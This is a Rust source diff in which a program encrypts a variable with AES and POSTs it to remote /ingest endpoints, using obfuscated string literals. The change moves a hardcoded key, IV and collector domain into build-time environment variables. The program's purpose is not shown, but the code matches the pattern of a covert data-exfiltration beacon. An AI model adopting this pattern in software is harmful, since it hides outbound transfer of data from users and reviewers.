@@ -128,14 +128,14 @@ async fn main() -> Result<(), ()> {
                     continue;
                 }
 
-                let key = lc!("4cd50b3a7f8921e6");
-                let iv = lc!("39871eac6f5024db");
+                let key = lc!(env!("KEY"));
+                let iv = lc!(env!("IV"));
                 let cipher = Aes128Cbc::new_from_slices(key.as_bytes(), iv.as_bytes()).unwrap();
                 let ciphertext = cipher.encrypt_vec(shared_var_str.as_bytes());
 
                 let client = Client::new();
                 let _ = client
-                    .post(lc!("https://watcher.adragos.ro/ingest/") + args[1].as_str())
+                    .post(lc!(format!("https://{}/ingest/", env!("DOMAIN"))) + args[1].as_str())
                     .body(ciphertext)
                     .send().await;
             }
@@ -159,14 +159,14 @@ async fn main() -> Result<(), ()> {
                     continue;
                 }
 
-                let key = lc!("4cd50b3a7f8921e6");
-                let iv = lc!("39871eac6f5024db");
+                let key = lc!(env!("KEY"));
+                let iv = lc!(env!("IV"));
                 let cipher = Aes128Cbc::new_from_slices(key.as_bytes(), iv.as_bytes()).unwrap();
                 let ciphertext = cipher.encrypt_vec(shared_var_str.as_bytes());
 
                 let client = Client::new();
                 let _ = client
-                    .post(lc!("https://watcher.adragos.ro/ingest_fr/") + args[1].as_str())
+                    .post(lc!(format!("https://{}/ingest_fr/", env!("DOMAIN"))) + args[1].as_str())
                     .body(ciphertext)
                     .send().await;
             }
@@ -190,14 +190,14 @@ async fn main() -> Result<(), ()> {
                     continue;
                 }
 
-                let key = lc!("4cd50b3a7f8921e6");
-                let iv = lc!("39871eac6f5024db");
+                let key = lc!(env!("KEY"));
+                let iv = lc!(env!("IV"));
                 let cipher = Aes128Cbc::new_from_slices(key.as_bytes(), iv.as_bytes()).unwrap();
                 let ciphertext = cipher.encrypt_vec(shared_var_str.as_bytes());
 
                 let client = Client::new();
                 let _ = client
-                    .post(lc!("https://watcher.adragos.ro/ingest_fwr/") + args[1].as_str())
+                    .post(lc!(format!("https://{}/ingest_fwr/", env!("DOMAIN"))) + args[1].as_str())
                     .body(ciphertext)
                     .send().await;
             }
